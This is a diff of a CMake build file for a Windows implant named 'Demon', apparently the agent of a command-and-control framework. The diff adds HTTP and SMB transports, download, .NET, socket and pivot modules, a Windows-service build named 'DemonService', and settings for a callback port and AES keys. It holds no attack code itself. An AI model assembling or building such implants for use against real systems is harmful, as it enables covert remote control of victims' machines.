@@ -11,7 +11,7 @@ set( CMAKE_C_FLAGS "-Wl,--pic-executable,-e,main -Wl,-Bstatic -s -w -ffunction-s
 # adding demon sources
 include_directories( Include )
 
-set( COMMON_SOURCE Source/Core/Core.c
+set( COMMON_SOURCE
         Source/Core/Command.c
         Source/Core/WinUtils.c
         Source/Core/Win32.c
@@ -23,10 +23,14 @@ set( COMMON_SOURCE Source/Core/Core.c
         Source/Core/Syscalls.c
         Source/Core/Command.c
         Source/Core/Transport.c
+        Source/Core/TransportHttp.c
+        Source/Core/TransportSmb.c
         Source/Core/Parser.c
         Source/Core/Pivot.c
-        Source/Core/Config.c
         Source/Core/Jobs.c
+        Source/Core/Download.c
+        Source/Core/Dotnet.c
+        Source/Core/Socket.c
 
         Source/Extra/KaynLdr.c
 )
@@ -43,14 +47,17 @@ set( LOADER_SOURCE
 )
 
 set( MAIN_SOURCE
+        # Demon Main entrypoint
+        Source/Demon.c
+
         # windows exe
         Source/Main/MainExe.c
 
         # windows dll
         Source/Main/MainDll.c
 
-        # windows reflective dll
-        Source/Main/MainReflectiveDll.c
+        # windows service
+        Source/Main/MainSvc.c
 )
 
 set( CRYPT_SOURCE
@@ -63,9 +70,11 @@ add_compile_definitions( DEBUG )
 add_compile_definitions( CONFIG_BYTES={} )
 add_compile_definitions( CONFIG_SIZE=1024 )
 add_compile_definitions( CONFIG_KEY_BYTES={} )
-add_compile_definitions( CONFIG_KEY_SIZE=1024 )
+add_compile_definitions( CONFIG_KEY_SIZE=16 )
+add_compile_definitions( SERVICE_NAME="DemonService" )
 
 add_compile_definitions( TRANSPORT_HTTP )
+add_compile_definitions( TRANSPORT_SMB )
 add_compile_definitions( AES256 )
 add_compile_definitions( PORT=4545 )          # 4545
 add_compile_definitions( SERVER=69 )
